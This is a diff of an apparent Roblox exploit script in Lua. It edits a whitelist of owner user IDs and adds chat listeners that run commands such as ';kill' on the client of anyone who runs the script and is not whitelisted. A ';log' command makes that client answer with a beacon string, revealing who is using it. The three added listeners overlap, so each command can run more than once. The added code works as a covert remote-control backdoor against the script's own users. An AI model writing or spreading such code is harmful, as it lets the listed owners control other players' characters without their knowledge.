@@ -4,13 +4,13 @@ local LOCAL_PLAYER = Players.LocalPlayer
 
 local whitelist = {
 	Owner = {
-		4279175156, 4202838123, 4307561815, 4380912728, 8334967500, 4240568437, 4262245137, 8336776571, 8309882908, 8335222717,
-		4429753384, 8038312847, 3662747580, 4371940736, 116968806, 8337993466, 8336675908, 8293712327, 8244741218, 8313657982
+		4279175156, 4202838123, 4307561815, 4380912728, 8334967500, 4240568437, 4262245137, 8336776571,
+		4429753384, 8038312847, 3662747580, 4371940736, 116968806, 8337993466, 8336675908, 8293712327
 	},
 	Private = {
-		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800, 8338110211,
-		5546161719, 1983015440, 3204169739, 1880511134, 8336731586, 314732068, 3932037947, 8305374142,
-		570843764, 4285992482, 8319446554, 8253283385, 8244658784, 8244710849, 8336505332, 8293567118
+		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800,
+		5546161719, 1983015440, 3204169739, 1880511134, 314732068, 3932037947,
+		570843764, 4285992482, 8319446554, 8253283385, 8244658784, 8244710849
 	},
 	Slow = {1562251033}
 }
@@ -66,10 +66,6 @@ end
 for _, p in ipairs(Players:GetPlayers()) do tag(p) end
 Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
-local function getHRP()
-	return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
-end
-
 local function exec(cmd, senderId)
 	cmd = string.lower(cmd)
 	local undo = false
@@ -80,6 +76,10 @@ local function exec(cmd, senderId)
 
 	local sender = Players:GetPlayerByUserId(senderId)
 	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end
+
+	local function getHRP()
+		return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
+	end
 
 	if cmd == ";kill" and not undo then
 		local c = LOCAL_PLAYER.Character
@@ -163,6 +163,64 @@ local function exec(cmd, senderId)
 		end
 	end
 end
+
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+	if uid == LOCAL_PLAYER.UserId then return end
+
+	if isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		exec(t, uid)
+
+		if t == ";log" then
+			task.delay(0.4, function()
+				local whisper = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXWhisper")
+				local target = Players:GetPlayerByUserId(uid)
+				if whisper and target then
+					whisper:SendAsync("8Uz1P", target)
+				end
+			end)
+		end
+	end
+end)
+
+local function chatMessage(str)
+	str = tostring(str)
+	pcall(function()
+		TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+	end)
+end
+
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+
+	if uid ~= LOCAL_PLAYER.UserId and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		exec(t, uid)
+	end
+
+	if t == ";log" and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		task.delay(0.4, function()
+			chatMessage("8Uz1P")
+		end)
+	end
+end)
+
+
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+	if uid == LOCAL_PLAYER.UserId then return end
+	if not isWhitelisted(uid) then return end
+	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
+	exec(t, uid)
+end)
 
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
